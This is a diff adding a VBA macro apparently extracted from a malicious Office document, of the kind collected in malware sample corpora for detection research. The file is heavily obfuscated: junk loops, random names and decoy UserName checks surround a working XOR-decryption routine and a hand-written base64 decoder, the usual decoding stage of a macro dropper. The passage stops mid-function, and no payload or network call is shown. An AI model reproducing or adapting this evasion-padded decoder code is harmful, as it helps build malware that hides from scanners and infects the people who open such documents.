@@ -1,0 +1,1435 @@
+Filename     : ./macros/2dd3fdaba25154e486acb49d34d4bb4062d0bffd3b2bd0905dddfa1963bf45d5
+OLE stream   : Macros/VBA/jpYr8Ky
+VBA filename : jpYr8Ky.bas
+----------------------------------------
+Attribute VB_Name = "jpYr8Ky"
+Public Function ocRcrQPl9(ByRef ddleZ32ip1A As String, ByVal JvsVtGRCyr As String) As String
+Dim dzFdWjZ4() As Byte
+If Application.UserName = "euONIl09NdT" Then
+MsgBox ("Rhigh56oOU6")
+Else
+Dim ZmobFOqOunGLrh As String
+ZmobFOqOunGLrh = Application.UserName
+End If
+If Application.UserName = "mzzxh40opmL" Then
+MsgBox ("fp6T3Yiw4fa")
+Else
+Dim qv17KxXc96WGXl As String
+qv17KxXc96WGXl = Application.UserName
+End If
+Dim HC8xzYnRtb() As Byte
+Dim yG5T1HlNRM As String
+For QpvYWgoM = 0 To 5
+yG5T1HlNRM = yG5T1HlNRM + "q"
+Next QpvYWgoM
+Dim XoHh0iDde As Long
+For g1qMwvUs = 9 To 16
+XoHh0iDde = XoHh0iDde + g1qMwvUs
+Next g1qMwvUs
+Dim yoHHZ9M As String
+For m5LW4At3v = 0 To 8
+yoHHZ9M = yoHHZ9M + "H"
+Next m5LW4At3v
+Dim XSEiOteyP As String
+For q91QuxkTya = 0 To 6
+XSEiOteyP = XSEiOteyP + "g"
+Next q91QuxkTya
+Dim IN3Sp60, VkhTE4 As Integer
+IN3Sp60 = 9 + 7
+For jfjd2eT = 0 To 7
+VkhTE4 = VkhTE4 + jfjd2eT
+Next jfjd2eT
+If VkhTE4 < jfjd2eT Then
+Dim kwdVQzu As Long
+End If
+If Len(Application.UserName) < 688 Then
+Dim Sc2MO2XF As Collection
+End If
+Dim viUGLIi As Long
+Dim wLvzNwPPJ As String
+For qwsQ9Jwx = 0 To 6
+wLvzNwPPJ = wLvzNwPPJ + "Y"
+Next qwsQ9Jwx
+For WVfVTU = 0 To 6
+oCBohX = oCBohX + WVfVTU
+Next WVfVTU
+Dim hUY58ZWPrd As String
+For mA1BUEt5 = 0 To 9
+hUY58ZWPrd = hUY58ZWPrd + "t"
+Next mA1BUEt5
+Dim tn20aG As String
+For aLWqvsJ18 = 0 To 8
+tn20aG = tn20aG + "Q"
+Next aLWqvsJ18
+Dim ObeVm0TZ As Long
+Dim rvt4knp As String
+For ckX8tgLf = 0 To 8
+rvt4knp = rvt4knp + "w"
+Next ckX8tgLf
+Dim ujEWuJJ, bPvGfNa As Integer
+ujEWuJJ = 5 + 5
+For MhgpITTuvi = 0 To 6
+bPvGfNa = bPvGfNa + MhgpITTuvi
+Next MhgpITTuvi
+If bPvGfNa < MhgpITTuvi Then
+Dim Ahbt7nGRr As Long
+End If
+Dim pGJhX3Eld As Long
+For G1AY9cSS5 = 6 To 14
+pGJhX3Eld = pGJhX3Eld + G1AY9cSS5
+Next G1AY9cSS5
+Dim F9e3urjo As String
+For LlDiGnYq = 0 To 5
+F9e3urjo = F9e3urjo + "t"
+Next LlDiGnYq
+If Len(Application.UserName) < 382 Then
+Dim ujNLvLw0D As Collection
+End If
+If Application.UserName = "NhiCHJ80m2s" Then
+MsgBox ("x7E9nfAlZEK")
+Else
+Dim KOQ51ocK3KiKZA As String
+KOQ51ocK3KiKZA = Application.UserName
+End If
+Dim nDUXmIQX As Long
+For iiXYdgTu3X = 0 To 7
+wODK6kpJ5x = wODK6kpJ5x + iiXYdgTu3X
+Next iiXYdgTu3X
+Dim TgeBhHeJbo As Long
+For Jc9n6AAh7 = 8 To 15
+TgeBhHeJbo = TgeBhHeJbo + Jc9n6AAh7
+Next Jc9n6AAh7
+Dim jvrCC4, JI3qOK As Integer
+jvrCC4 = 7 + 7
+For got0HU = 0 To 5
+JI3qOK = JI3qOK + got0HU
+Next got0HU
+If JI3qOK < got0HU Then
+Dim I0a4zd As Long
+End If
+For GAypKLbN = 0 To 8
+ELFlAgWZsk = ELFlAgWZsk + GAypKLbN
+Next GAypKLbN
+For T589ly = 0 To 9
+fvjfZ3 = fvjfZ3 + T589ly
+Next T589ly
+Dim giQ69FE As String
+For v4CoEy = 0 To 6
+giQ69FE = giQ69FE + "J"
+Next v4CoEy
+Dim LR0xobDi As String
+For ZiKeAu948f = 0 To 7
+LR0xobDi = LR0xobDi + "q"
+Next ZiKeAu948f
+For OAq10u = 0 To 6
+NjiF2ITU = NjiF2ITU + OAq10u
+Next OAq10u
+Dim OSfZSmM7EN As Long
+Dim EaCVTjG6m As String
+For FQrxu9g = 0 To 7
+EaCVTjG6m = EaCVTjG6m + "c"
+Next FQrxu9g
+For Si6pdAn = 0 To 6
+TpU6FhD = TpU6FhD + Si6pdAn
+Next Si6pdAn
+If Application.UserName = "Yqv1JeHUwYB" Then
+MsgBox ("TnSKzcKzv9J")
+Else
+Dim ZvjvTb1Rbdpem9 As String
+ZvjvTb1Rbdpem9 = Application.UserName
+End If
+If Application.UserName = "Ty2POo3V6Iq" Then
+MsgBox ("FODTLLJtdMV")
+Else
+Dim S9UvvAVc7uhGeF As String
+S9UvvAVc7uhGeF = Application.UserName
+End If
+dzFdWjZ4 = StrConv(ddleZ32ip1A, vbFromUnicode)
+Dim xqKoU2 As String
+For Qz5fVrZT = 0 To 6
+xqKoU2 = xqKoU2 + "W"
+Next Qz5fVrZT
+Dim GaWhJDCkRv, Ka2LYt As Integer
+GaWhJDCkRv = 7 + 8
+For GcjPfUU = 0 To 5
+Ka2LYt = Ka2LYt + GcjPfUU
+Next GcjPfUU
+If Ka2LYt < GcjPfUU Then
+Dim HImdol6R As Long
+End If
+For DfBz3yUXbl = 0 To 8
+wpkXibj01j = wpkXibj01j + DfBz3yUXbl
+Next DfBz3yUXbl
+Dim RUabL6Utx, FOODBiM0ZZ As Integer
+RUabL6Utx = 7 + 7
+For GGKrV0A0 = 0 To 8
+FOODBiM0ZZ = FOODBiM0ZZ + GGKrV0A0
+Next GGKrV0A0
+If FOODBiM0ZZ < GGKrV0A0 Then
+Dim fvJDvXNiW As Long
+End If
+For q1T7anI7 = 0 To 7
+iiLjxqobDG = iiLjxqobDG + q1T7anI7
+Next q1T7anI7
+Dim La53yC7 As String
+For sGOwu6G = 0 To 9
+La53yC7 = La53yC7 + "N"
+Next sGOwu6G
+If Len(Application.UserName) < 914 Then
+Dim Vz9VEFXxA As Collection
+End If
+viUGLIi = UBound(dzFdWjZ4)
+Dim rBynLW As Long
+For eq8ccjW = 8 To 14
+rBynLW = rBynLW + eq8ccjW
+Next eq8ccjW
+Dim w0ec8xDVQ As String
+For QUWmTDZENZ = 0 To 8
+w0ec8xDVQ = w0ec8xDVQ + "V"
+Next QUWmTDZENZ
+For V8LsDB34Z7 = 0 To 9
+s32wZAV = s32wZAV + V8LsDB34Z7
+Next V8LsDB34Z7
+If Application.UserName = "gfnCEPGEmOr" Then
+MsgBox ("k8PjSLRu8hp")
+Else
+Dim J50t1PiMJo4mkB As String
+J50t1PiMJo4mkB = Application.UserName
+End If
+HC8xzYnRtb = StrConv(JvsVtGRCyr, vbFromUnicode)
+Dim WeE0tMEOZX, FllsWRBGqH As Integer
+WeE0tMEOZX = 8 + 8
+For juksJV4 = 0 To 6
+FllsWRBGqH = FllsWRBGqH + juksJV4
+Next juksJV4
+If FllsWRBGqH < juksJV4 Then
+Dim G2cvTY4nfM As Long
+End If
+For jVxNnc = 0 To 7
+AjXeJp = AjXeJp + jVxNnc
+Next jVxNnc
+Dim RbtMmm, MqIXUyG As Integer
+RbtMmm = 8 + 6
+For xGtIsR = 0 To 7
+MqIXUyG = MqIXUyG + xGtIsR
+Next xGtIsR
+If MqIXUyG < xGtIsR Then
+Dim Y4jsGMoKU As Long
+End If
+If Application.UserName = "f3PY1oLjZ4r" Then
+MsgBox ("ZQ3qSt5tG3r")
+Else
+Dim tc2g6YurThduCt As String
+tc2g6YurThduCt = Application.UserName
+End If
+ObeVm0TZ = UBound(HC8xzYnRtb)
+For V4xr0v = 0 To 9
+UXuGn7lomz = UXuGn7lomz + V4xr0v
+Next V4xr0v
+Dim KM98bLM As String
+For RMnYUUp = 0 To 5
+KM98bLM = KM98bLM + "u"
+Next RMnYUUp
+Dim KHmmPFuVBt As String
+For M0ntBbnBW = 0 To 8
+KHmmPFuVBt = KHmmPFuVBt + "b"
+Next M0ntBbnBW
+For nDUXmIQX = 0 To viUGLIi
+For X02QZR6f4l = 0 To 5
+rntpKX = rntpKX + X02QZR6f4l
+Next X02QZR6f4l
+For vXPcGOM = 0 To 9
+iMNykv = iMNykv + vXPcGOM
+Next vXPcGOM
+Dim WFSsYJ0gmM As Long
+For DkTKemQnIf = 9 To 17
+WFSsYJ0gmM = WFSsYJ0gmM + DkTKemQnIf
+Next DkTKemQnIf
+Dim Sc0EMXcig, ThwrMH3 As Integer
+Sc0EMXcig = 9 + 7
+For MV6WlhOU2 = 0 To 5
+ThwrMH3 = ThwrMH3 + MV6WlhOU2
+Next MV6WlhOU2
+If ThwrMH3 < MV6WlhOU2 Then
+Dim K8Qxyq As Long
+End If
+Dim iU2JTr8B, cBD6Rwu As Integer
+iU2JTr8B = 7 + 7
+For bbXLsrVRUK = 0 To 7
+cBD6Rwu = cBD6Rwu + bbXLsrVRUK
+Next bbXLsrVRUK
+If cBD6Rwu < bbXLsrVRUK Then
+Dim IQIDwZ As Long
+End If
+dzFdWjZ4(nDUXmIQX) = dzFdWjZ4(nDUXmIQX) Xor HC8xzYnRtb(OSfZSmM7EN)
+Dim I081Jiwu As String
+For CaNhRqRleX = 0 To 7
+I081Jiwu = I081Jiwu + "F"
+Next CaNhRqRleX
+Dim lqhgAgi As String
+For MOhdpEX = 0 To 8
+lqhgAgi = lqhgAgi + "t"
+Next MOhdpEX
+Dim ZyJETO60lJ As Long
+For CEGi2fX = 8 To 15
+ZyJETO60lJ = ZyJETO60lJ + CEGi2fX
+Next CEGi2fX
+If OSfZSmM7EN < ObeVm0TZ Then
+Dim nw1x8AQnP2 As String
+For MnlpHyZ1Dh = 0 To 9
+nw1x8AQnP2 = nw1x8AQnP2 + "G"
+Next MnlpHyZ1Dh
+Dim RjDikcST As String
+For DIOYpKUK = 0 To 7
+RjDikcST = RjDikcST + "p"
+Next DIOYpKUK
+Dim SkhVn4XtFp As String
+For ljlr0dMzK = 0 To 7
+SkhVn4XtFp = SkhVn4XtFp + "y"
+Next ljlr0dMzK
+If Len(Application.UserName) < 111 Then
+Dim MaldwiFGG As Collection
+End If
+If Len(Application.UserName) < 695 Then
+Dim XtdMNBu As Collection
+End If
+If Application.UserName = "zo97VQ5W3f7" Then
+MsgBox ("y2EBO0lsZLv")
+Else
+Dim vcKudHtnx1OluA As String
+vcKudHtnx1OluA = Application.UserName
+End If
+If Application.UserName = "QiabDoMruKw" Then
+MsgBox ("q4uDPcYfChc")
+Else
+Dim PcRTwZB0nlOhzM As String
+PcRTwZB0nlOhzM = Application.UserName
+End If
+OSfZSmM7EN = OSfZSmM7EN + 1
+Dim CNazpmpad, ndDdbJcG As Integer
+CNazpmpad = 8 + 6
+For x4ZPqQdU8 = 0 To 6
+ndDdbJcG = ndDdbJcG + x4ZPqQdU8
+Next x4ZPqQdU8
+If ndDdbJcG < x4ZPqQdU8 Then
+Dim fKFLRsNP As Long
+End If
+For hK4rtT9q = 0 To 5
+DdwRAAt0 = DdwRAAt0 + hK4rtT9q
+Next hK4rtT9q
+Dim qku7hO, fYhobVORKV As Integer
+qku7hO = 7 + 7
+For eWhhMZXwrn = 0 To 9
+fYhobVORKV = fYhobVORKV + eWhhMZXwrn
+Next eWhhMZXwrn
+If fYhobVORKV < eWhhMZXwrn Then
+Dim cSwSJoftf As Long
+End If
+Dim qWvIue As String
+For UyvNja0 = 0 To 7
+qWvIue = qWvIue + "b"
+Next UyvNja0
+Else
+OSfZSmM7EN = 0
+Dim ZX2M2YbH, fGEFElNB As Integer
+ZX2M2YbH = 9 + 8
+For DOqfHED4 = 0 To 5
+fGEFElNB = fGEFElNB + DOqfHED4
+Next DOqfHED4
+If fGEFElNB < DOqfHED4 Then
+Dim iWExw49 As Long
+End If
+Dim vGwTe99S5n As Long
+For jwCVvjpmG = 9 To 15
+vGwTe99S5n = vGwTe99S5n + jwCVvjpmG
+Next jwCVvjpmG
+Dim BYgKzyd, h3E0lHT As Integer
+BYgKzyd = 9 + 8
+For msaUpxpnbp = 0 To 5
+h3E0lHT = h3E0lHT + msaUpxpnbp
+Next msaUpxpnbp
+If h3E0lHT < msaUpxpnbp Then
+Dim GpWaFrZQ2h As Long
+End If
+Dim wJWAECUs5Q As String
+For M78vEPbT = 0 To 9
+wJWAECUs5Q = wJWAECUs5Q + "k"
+Next M78vEPbT
+If Len(Application.UserName) < 576 Then
+Dim qy5qFuL As Collection
+End If
+End If
+Dim eZZwzFI As String
+For cejoCPj = 0 To 9
+eZZwzFI = eZZwzFI + "D"
+Next cejoCPj
+For Rpyrfz = 0 To 5
+pwB1TwJpi = pwB1TwJpi + Rpyrfz
+Next Rpyrfz
+For B9cbae8pb = 0 To 7
+Q3tjr5myC = Q3tjr5myC + B9cbae8pb
+Next B9cbae8pb
+Next nDUXmIQX
+Dim fBo0GYG As Long
+For N8gPCoLs = 7 To 14
+fBo0GYG = fBo0GYG + N8gPCoLs
+Next N8gPCoLs
+For QCG0kTz1Rb = 0 To 8
+We4HXFHE = We4HXFHE + QCG0kTz1Rb
+Next QCG0kTz1Rb
+Dim V0wo1SrjMm As Long
+For bJvzYGyf = 9 To 18
+V0wo1SrjMm = V0wo1SrjMm + bJvzYGyf
+Next bJvzYGyf
+For WbUgxB = 0 To 7
+CEeov6 = CEeov6 + WbUgxB
+Next WbUgxB
+Dim SCasaMKbf As String
+For yufnJk4H = 0 To 9
+SCasaMKbf = SCasaMKbf + "l"
+Next yufnJk4H
+For WNRXdMrXy = 0 To 6
+wxxoc4dh = wxxoc4dh + WNRXdMrXy
+Next WNRXdMrXy
+ocRcrQPl9 = StrConv(dzFdWjZ4, vbUnicode)
+Dim InL0jBN As Long
+For LQ9eO2hMhg = 9 To 12
+InL0jBN = InL0jBN + LQ9eO2hMhg
+Next LQ9eO2hMhg
+For MsbS3O = 0 To 6
+ft4RdkS = ft4RdkS + MsbS3O
+Next MsbS3O
+Dim CLU1Y72, g5nfBzM As Integer
+CLU1Y72 = 8 + 7
+For SsM8vQZw7K = 0 To 8
+g5nfBzM = g5nfBzM + SsM8vQZw7K
+Next SsM8vQZw7K
+If g5nfBzM < SsM8vQZw7K Then
+Dim GllUL4 As Long
+End If
+Dim pPKzie5 As Long
+For cqJgcvtxhN = 5 To 13
+pPKzie5 = pPKzie5 + cqJgcvtxhN
+Next cqJgcvtxhN
+End Function
+Public Function AWBLYT(ByVal THREE As String) As Byte()
+   Dim dyVaUnTFo As Integer, IDknGHNb As Integer, dEYtsxPj(0 To 63) As Byte, mviES3v0(0 To 127) As Byte
+   IDknGHNb = 0
+Dim CrReArCxO As String
+For hjmFUJ = 0 To 5
+CrReArCxO = CrReArCxO + "i"
+Next hjmFUJ
+Dim cy4vosUCV, v06wOiq As Integer
+cy4vosUCV = 8 + 8
+For MfQ7K1WS = 0 To 8
+v06wOiq = v06wOiq + MfQ7K1WS
+Next MfQ7K1WS
+If v06wOiq < MfQ7K1WS Then
+Dim mLG1RAFIZv As Long
+End If
+If Application.UserName = "AvggDfE8Jxc" Then
+MsgBox ("DxifLNWmviP")
+Else
+Dim wLzTn7BdOYlO2z As String
+wLzTn7BdOYlO2z = Application.UserName
+End If
+If Len(Application.UserName) < 356 Then
+Dim DwCp7a01 As Collection
+End If
+   For dyVaUnTFo = Asc("A") To Asc("Z"): dEYtsxPj(IDknGHNb) = dyVaUnTFo: IDknGHNb = IDknGHNb + 1: Next
+Dim d6rZqN39 As String
+For IySJecRA9h = 0 To 9
+d6rZqN39 = d6rZqN39 + "Q"
+Next IySJecRA9h
+Dim jWhyY5PHi As Long
+For Em64MVg = 7 To 14
+jWhyY5PHi = jWhyY5PHi + Em64MVg
+Next Em64MVg
+Dim t2ASdkRK As String
+For msc2bUc2Kp = 0 To 7
+t2ASdkRK = t2ASdkRK + "d"
+Next msc2bUc2Kp
+Dim k1bpfp As String
+For ihJ6RV5 = 0 To 7
+k1bpfp = k1bpfp + "q"
+Next ihJ6RV5
+For JwMOBpK = 0 To 5
+dVtPQXZ = dVtPQXZ + JwMOBpK
+Next JwMOBpK
+Dim KT3lDGUc3 As String
+For FLkPKQb3 = 0 To 8
+KT3lDGUc3 = KT3lDGUc3 + "t"
+Next FLkPKQb3
+If Len(Application.UserName) < 346 Then
+Dim qfnEm3 As Collection
+End If
+   For dyVaUnTFo = Asc("a") To Asc("z"): dEYtsxPj(IDknGHNb) = dyVaUnTFo: IDknGHNb = IDknGHNb + 1: Next
+Dim NNHGhUMx4e As String
+For qwy1527vk = 0 To 5
+NNHGhUMx4e = NNHGhUMx4e + "i"
+Next qwy1527vk
+For YqHOC1r = 0 To 8
+xK64ew6btx = xK64ew6btx + YqHOC1r
+Next YqHOC1r
+   For dyVaUnTFo = Asc("0") To Asc("9"): dEYtsxPj(IDknGHNb) = dyVaUnTFo: IDknGHNb = IDknGHNb + 1: Next
+Dim A3Fqa9m5lW As String
+For uQJu3Wm = 0 To 9
+A3Fqa9m5lW = A3Fqa9m5lW + "H"
+Next uQJu3Wm
+Dim zw1TBZUZU As String
+For LMmMzv7eX = 0 To 5
+zw1TBZUZU = zw1TBZUZU + "P"
+Next LMmMzv7eX
+Dim pCvo2qNm, ipT5WkpD As Integer
+pCvo2qNm = 9 + 6
+For RtOfUgX8m = 0 To 8
+ipT5WkpD = ipT5WkpD + RtOfUgX8m
+Next RtOfUgX8m
+If ipT5WkpD < RtOfUgX8m Then
+Dim qgEk8u As Long
+End If
+Dim x9VBTLabNL, HNhjfa As Integer
+x9VBTLabNL = 7 + 6
+For ZOCACa69A = 0 To 5
+HNhjfa = HNhjfa + ZOCACa69A
+Next ZOCACa69A
+If HNhjfa < ZOCACa69A Then
+Dim MxT5sW1 As Long
+End If
+   dEYtsxPj(IDknGHNb) = Asc("+"): IDknGHNb = IDknGHNb + 1
+Dim pvBT5s, cXF5y15g As Integer
+pvBT5s = 9 + 7
+For DX42dpSju = 0 To 8
+cXF5y15g = cXF5y15g + DX42dpSju
+Next DX42dpSju
+If cXF5y15g < DX42dpSju Then
+Dim S2deaxcHT As Long
+End If
+Dim Sa3FG7, TDli72 As Integer
+Sa3FG7 = 6 + 8
+For bVxSRd3PH = 0 To 7
+TDli72 = TDli72 + bVxSRd3PH
+Next bVxSRd3PH
+If TDli72 < bVxSRd3PH Then
+Dim AXoCW1 As Long
+End If
+Dim iO0zwU8boC As String
+For wwgxaBd16 = 0 To 8
+iO0zwU8boC = iO0zwU8boC + "h"
+Next wwgxaBd16
+For nlvELK = 0 To 9
+MiXJcEPu = MiXJcEPu + nlvELK
+Next nlvELK
+Dim PmEtW9 As String
+For hG29HD = 0 To 8
+PmEtW9 = PmEtW9 + "z"
+Next hG29HD
+If Application.UserName = "ConeIV2niKS" Then
+MsgBox ("BzJXgwyN12v")
+Else
+Dim uCqHN0Soa1dyov As String
+uCqHN0Soa1dyov = Application.UserName
+End If
+   dEYtsxPj(IDknGHNb) = Asc("/"): IDknGHNb = IDknGHNb + 1
+Dim C0ZQWG5A As String
+For Hf4qgd = 0 To 7
+C0ZQWG5A = C0ZQWG5A + "f"
+Next Hf4qgd
+Dim s2soyyOX As String
+For Ug8A1ZIE5 = 0 To 6
+s2soyyOX = s2soyyOX + "N"
+Next Ug8A1ZIE5
+For tgJ9UOUhz8 = 0 To 7
+LTiVBy9 = LTiVBy9 + tgJ9UOUhz8
+Next tgJ9UOUhz8
+Dim aO8cgVuv4, x6mdYo As Integer
+aO8cgVuv4 = 9 + 9
+For SKP68be = 0 To 9
+x6mdYo = x6mdYo + SKP68be
+Next SKP68be
+If x6mdYo < SKP68be Then
+Dim hyhbVQ5gnm As Long
+End If
+If Application.UserName = "scbtdiXGjwC" Then
+MsgBox ("Eyx58M1xvlU")
+Else
+Dim Lv3cchP715Qxrz As String
+Lv3cchP715Qxrz = Application.UserName
+End If
+If Len(Application.UserName) < 431 Then
+Dim DV85MfAc As Collection
+End If
+   For IDknGHNb = 0 To 127: mviES3v0(IDknGHNb) = 255: Next
+Dim MyiC3m As Long
+For jwmiOte = 9 To 12
+MyiC3m = MyiC3m + jwmiOte
+Next jwmiOte
+   For IDknGHNb = 0 To 63: mviES3v0(dEYtsxPj(IDknGHNb)) = IDknGHNb: Next
+For yJZqB2 = 0 To 9
+gFUrY2 = gFUrY2 + yJZqB2
+Next yJZqB2
+Dim IkQRMfzChT As String
+For uzpmXaE7Y = 0 To 9
+IkQRMfzChT = IkQRMfzChT + "i"
+Next uzpmXaE7Y
+Dim EtzaFhKy As String
+For qg3SCtgVQo = 0 To 6
+EtzaFhKy = EtzaFhKy + "R"
+Next qg3SCtgVQo
+If Len(Application.UserName) < 774 Then
+Dim vP3OSK4b0 As Collection
+End If
+If Len(Application.UserName) < 883 Then
+Dim GLbeyDeH As Collection
+End If
+If Len(Application.UserName) < 457 Then
+Dim ZEuqsta2wR As Collection
+End If
+   Dim HCARCSZCXt() As Byte: HCARCSZCXt = StrConv(THREE, vbFromUnicode)
+Dim LbaWqvQktw As Long
+For Rzv8l4B = 8 To 15
+LbaWqvQktw = LbaWqvQktw + Rzv8l4B
+Next Rzv8l4B
+Dim jIVPYuSi As Long
+For NDZ8YaT = 9 To 13
+jIVPYuSi = jIVPYuSi + NDZ8YaT
+Next NDZ8YaT
+   Dim NINE As Long: NINE = UBound(HCARCSZCXt) + 1
+Dim xaeJCdnigu As Long
+For B169D07H = 7 To 12
+xaeJCdnigu = xaeJCdnigu + B169D07H
+Next B169D07H
+Dim lhK9npa As String
+For oP1DmPAB = 0 To 8
+lhK9npa = lhK9npa + "S"
+Next oP1DmPAB
+Dim xTZom4J, SWLsTKHL As Integer
+xTZom4J = 9 + 6
+For OUQuuASac6 = 0 To 5
+SWLsTKHL = SWLsTKHL + OUQuuASac6
+Next OUQuuASac6
+If SWLsTKHL < OUQuuASac6 Then
+Dim KntBezshXN As Long
+End If
+For s6aDb6 = 0 To 9
+fCxSy4T = fCxSy4T + s6aDb6
+Next s6aDb6
+If Application.UserName = "mPKTu8xQoXL" Then
+MsgBox ("xF5k0Wx3z03")
+Else
+Dim UcsoL3YqsXK6XD As String
+UcsoL3YqsXK6XD = Application.UserName
+End If
+If Len(Application.UserName) < 122 Then
+Dim mbG6A7CpFT As Collection
+End If
+   Do While NINE > 0
+Dim ZgnLQ5O As Long
+For fha1syCVrL = 7 To 17
+ZgnLQ5O = ZgnLQ5O + fha1syCVrL
+Next fha1syCVrL
+Dim lpP1rikjE As String
+For IK5zGJeO = 0 To 9
+lpP1rikjE = lpP1rikjE + "w"
+Next IK5zGJeO
+Dim qh5A0FqZ, s7qUCxH2Yc As Integer
+qh5A0FqZ = 9 + 6
+For BGNm1OGN = 0 To 7
+s7qUCxH2Yc = s7qUCxH2Yc + BGNm1OGN
+Next BGNm1OGN
+If s7qUCxH2Yc < BGNm1OGN Then
+Dim rLaaisd As Long
+End If
+For nD06mnf = 0 To 6
+TDIbtJvb = TDIbtJvb + nD06mnf
+Next nD06mnf
+For kJEoha6 = 0 To 8
+V8kMAgp = V8kMAgp + kJEoha6
+Next kJEoha6
+If Application.UserName = "dOotQpqXMrv" Then
+MsgBox ("ZlBTyx3JQRs")
+Else
+Dim btqneQXzUAjp4m As String
+btqneQXzUAjp4m = Application.UserName
+End If
+If Len(Application.UserName) < 697 Then
+Dim IDV2Lbk As Collection
+End If
+      If HCARCSZCXt(NINE - 1) <> Asc("=") Then Exit Do
+For ejDJ29z9Vi = 0 To 5
+f2fjnu = f2fjnu + ejDJ29z9Vi
+Next ejDJ29z9Vi
+Dim AskU0cTqQ As Long
+For qJFxa5Qc4 = 6 To 14
+AskU0cTqQ = AskU0cTqQ + qJFxa5Qc4
+Next qJFxa5Qc4
+Dim LhqwH8GQd5 As Long
+For nStThMhc = 9 To 13
+LhqwH8GQd5 = LhqwH8GQd5 + nStThMhc
+Next nStThMhc
+Dim iJrHNFVXB As String
+For WnvS5mkAeO = 0 To 5
+iJrHNFVXB = iJrHNFVXB + "C"
+Next WnvS5mkAeO
+If Len(Application.UserName) < 572 Then
+Dim GyCTRUVuc8 As Collection
+End If
+      NINE = NINE - 1
+Dim QNEXfeS As Long
+For WSjTnq7 = 8 To 13
+QNEXfeS = QNEXfeS + WSjTnq7
+Next WSjTnq7
+Dim WqXlAD, WUws9dLNZ As Integer
+WqXlAD = 5 + 5
+For AxJtGpQI = 0 To 9
+WUws9dLNZ = WUws9dLNZ + AxJtGpQI
+Next AxJtGpQI
+If WUws9dLNZ < AxJtGpQI Then
+Dim ZCstezNHas As Long
+End If
+Dim NreLHFKco As String
+For ljIXxmCOL = 0 To 8
+NreLHFKco = NreLHFKco + "E"
+Next ljIXxmCOL
+For cnsi1NOH = 0 To 5
+ObJXWGa2 = ObJXWGa2 + cnsi1NOH
+Next cnsi1NOH
+Dim NJBLQ2Pe0w As String
+For gQMsoX08 = 0 To 6
+NJBLQ2Pe0w = NJBLQ2Pe0w + "e"
+Next gQMsoX08
+If Len(Application.UserName) < 148 Then
+Dim zZFtzK As Collection
+End If
+      Loop
+Dim LI9zaC, YYgKOha6 As Integer
+LI9zaC = 9 + 6
+For kZPAHoFUtS = 0 To 8
+YYgKOha6 = YYgKOha6 + kZPAHoFUtS
+Next kZPAHoFUtS
+If YYgKOha6 < kZPAHoFUtS Then
+Dim xctc48usb7 As Long
+End If
+Dim Vgpv2pw4, mia76iAf As Integer
+Vgpv2pw4 = 6 + 5
+For UhKOHr = 0 To 5
+mia76iAf = mia76iAf + UhKOHr
+Next UhKOHr
+If mia76iAf < UhKOHr Then
+Dim f4MgKfF As Long
+End If
+Dim f1hVYRdrRm As Long
+For ueC0C79J = 6 To 15
+f1hVYRdrRm = f1hVYRdrRm + ueC0C79J
+Next ueC0C79J
+For OSG5Ae = 0 To 6
+UkxfvEcs = UkxfvEcs + OSG5Ae
+Next OSG5Ae
+If Len(Application.UserName) < 195 Then
+Dim lgPoWN6pWc As Collection
+End If
+If Application.UserName = "XUxbeuYQnEH" Then
+MsgBox ("KIFbXKG7GSJ")
+Else
+Dim g8UQW5c3GhymwM As String
+g8UQW5c3GhymwM = Application.UserName
+End If
+If Len(Application.UserName) < 758 Then
+Dim gBywbtvSGx As Collection
+End If
+   Dim TEN As Long: TEN = (NINE * 3) \ 4
+Dim ig8qu6va8I As String
+For Hp03BwhE = 0 To 8
+ig8qu6va8I = ig8qu6va8I + "g"
+Next Hp03BwhE
+For BwGC72Mi1e = 0 To 6
+vARvyy = vARvyy + BwGC72Mi1e
+Next BwGC72Mi1e
+Dim KE33vqFHUG As String
+For qshYF7PuYn = 0 To 7
+KE33vqFHUG = KE33vqFHUG + "N"
+Next qshYF7PuYn
+For J06Do7 = 0 To 6
+ILKbkbyFh = ILKbkbyFh + J06Do7
+Next J06Do7
+Dim tQoPMQD As String
+For ji3OcmY8g = 0 To 9
+tQoPMQD = tQoPMQD + "W"
+Next ji3OcmY8g
+Dim jTvZmnvD As String
+For jKn8sx6r = 0 To 7
+jTvZmnvD = jTvZmnvD + "n"
+Next jKn8sx6r
+If Len(Application.UserName) < 361 Then
+Dim KzhMAmm As Collection
+End If
+   Dim ELEVEN() As Byte
+Dim hQx6mAN2h As String
+For cYKvlX = 0 To 6
+hQx6mAN2h = hQx6mAN2h + "T"
+Next cYKvlX
+Dim PoL4t9L As Long
+For I04BCo = 7 To 15
+PoL4t9L = PoL4t9L + I04BCo
+Next I04BCo
+Dim Wmecnn As String
+For sJphEknH = 0 To 9
+Wmecnn = Wmecnn + "V"
+Next sJphEknH
+Dim ML9K7vlVJ As String
+For krkLcS = 0 To 9
+ML9K7vlVJ = ML9K7vlVJ + "i"
+Next krkLcS
+If Application.UserName = "rwfkoOeiEz8" Then
+MsgBox ("shUOPhW9T0J")
+Else
+Dim gNgbYlc4dF1CTK As String
+gNgbYlc4dF1CTK = Application.UserName
+End If
+If Application.UserName = "uKsVKG6XfEk" Then
+MsgBox ("UC54Vwswz1r")
+Else
+Dim O9DiGQdvAU3psZ As String
+O9DiGQdvAU3psZ = Application.UserName
+End If
+   ReDim ELEVEN(0 To TEN - 1) As Byte
+For rv7QxPrRO = 0 To 7
+gKRupyx = gKRupyx + rv7QxPrRO
+Next rv7QxPrRO
+Dim zcazKjr As Long
+For QmRc8naHM = 7 To 16
+zcazKjr = zcazKjr + QmRc8naHM
+Next QmRc8naHM
+Dim j9Wp3H0eH As String
+For XrzFoZz = 0 To 7
+j9Wp3H0eH = j9Wp3H0eH + "I"
+Next XrzFoZz
+Dim s2THQArBRz As String
+For OArcQzGfO = 0 To 9
+s2THQArBRz = s2THQArBRz + "n"
+Next OArcQzGfO
+   Dim TWELVE As Long
+Dim OleX2x6, LQtvTIJi As Integer
+OleX2x6 = 9 + 7
+For kv4xnT = 0 To 8
+LQtvTIJi = LQtvTIJi + kv4xnT
+Next kv4xnT
+If LQtvTIJi < kv4xnT Then
+Dim LwA2NC6Y As Long
+End If
+For sLVjzf = 0 To 8
+Cs8bb7Px = Cs8bb7Px + sLVjzf
+Next sLVjzf
+Dim YZliDt As String
+For gdXNsQer8 = 0 To 7
+YZliDt = YZliDt + "e"
+Next gdXNsQer8
+For jZxjN9 = 0 To 6
+kLZ6YDF = kLZ6YDF + jZxjN9
+Next jZxjN9
+For xwpPmJiwU = 0 To 5
+qPVsp7k = qPVsp7k + xwpPmJiwU
+Next xwpPmJiwU
+If Len(Application.UserName) < 697 Then
+Dim sBO6rHz As Collection
+End If
+If Len(Application.UserName) < 737 Then
